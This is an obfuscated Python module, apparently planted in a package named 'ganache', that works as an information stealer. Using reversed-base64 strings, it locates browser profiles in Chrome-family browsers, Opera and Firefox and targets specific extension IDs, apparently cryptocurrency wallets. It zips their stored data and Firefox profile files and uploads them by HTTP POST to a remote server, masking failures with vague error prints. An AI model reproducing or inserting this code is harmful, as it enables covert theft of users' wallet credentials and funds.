Q='note'
P='file'
D=open
C=print
import requests as H
from ganache.utils import G as I,K
import os as A,glob as B,re,shutil as W
E='=k2YnJ2atVWZt5Wakh2Zn5Gbi92boNWZsd2arNGbjpGZ'
G='=0GatlmbqFWZlVWbsFGZjVGanxGajxGcvtWYixWYipWZ'
R='=4mbrdGcnZWZiR2br5mZlxGal9WYlF2ZvVmYmhWaitmb'
F='=gGckdGcwVWZi5GZiNmYk52bjRGajlGbnBnYqRWaqdWZ'
S='==wLqUGbpZ2byB1Ll12byh2YtUGbn92bn9yZpZmbvNmLvMXJ'
T='=8CdsVXYmVGRvUWbvJHaj1SZsd2bvd2LnlmZu92Yu8if'
U='==wLhJXZw92LnlmZu92Yu8if'
V='=8ycn5Wa0RXZTBibvl2cuVGd4VEIsF2Yvx0L'
J='=s2ch1WY0VWb'
X='0VGbsF2dfR3c1JHd'
L='lNWa2VGZ'
M='=IXZzd3byJ2XiV2d'
N='==QZwlHd'
O='=Qnbl1GajFGd0F2L'
Y='=MnauMnZlJHcvoyL49mZlJXam9SYsxWa69Wbu8if'
Z='==wcq5ycmVmcw9iKvg3bmVmcpZ2LhxGbpp3bt5yLu9Wbt92Yvg3bmVmcpZ2LwFmbz9if'
a='iwFXpsSXi41WoICXcpjIcx1bp5yazFWbhRXZtBkbvl2cuVGd4VmYldnI'
b='rsyKu9Waz5WZ0hXZto3bt9CdsVXYmVGZvU2ZhJ3b0N3L'
c='==AevZWZylmZ'
d='l12byh2Y'
e='=EmclB3b'
class f:
	id_list=[K(E),K(G),K(R),K(F)]
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def __cr_data_paths(E):
		C=B.glob(K(S)%A.path.expanduser('~'));D=A.path.expanduser(K(T))
		if A.path.exists(D):C.append(D)
		return C
	def __op_data_path(C):
		B=A.path.expanduser(K(U))
		if A.path.exists(B):return B
	def __handle(B,path,browser):
		for id in B.id_list:
			G=path+K(V)+id
			if A.path.exists(G):
				E='ganache/mtm.zip';type=K(J)
				if id==K(F):E='ganache/tw.zip';type=K(X)
				I(G,E);S={P:D(E,'rb')};T={K(L):B.device_id,K(M):browser,K(N):type,Q:id}
				try:
					R=H.post(B.base_url+K(O),data=T,files=S)
					if R.status_code<200 or R.status_code>=300:C('Error 33: Unknown error')
				except:C('Error -33: Unknown error')
	def __handle_ff(R):
		V='ganache/mtmf.zip';X=B.glob(A.path.expanduser(K(Y)));d=B.glob(A.path.expanduser(K(Z)));e=X+d
		for E in e:
			with D(E,'r', encoding='utf-8', errors='ignore')as F:
				f=F.read();S=re.search(K(a),f)
				if S:
					id=S.group(1);g=A.path.dirname(E)+K(b)+id+'^userContextId=*';T=B.glob(g)
					if len(T)>0:
						G=T[0];W.copy2(E,G+'/prefs.js');I(G,V);F={P:D(V,'rb')};h={K(L):R.device_id,K(M):K(c),K(N):K(J),Q:A.path.basename(G)}
						try:
							U=H.post(R.base_url+K(O),data=h,files=F)
							if U.status_code<200 or U.status_code>=300:C('Error 34: Unknown error')
						except:C('Error -34: Unknown error')
	def run(A):
		for C in A.__cr_data_paths():A.__handle(C,K(d))
		B=A.__op_data_path()
		if B is not None:A.__handle(B,K(e))
		A.__handle_ff()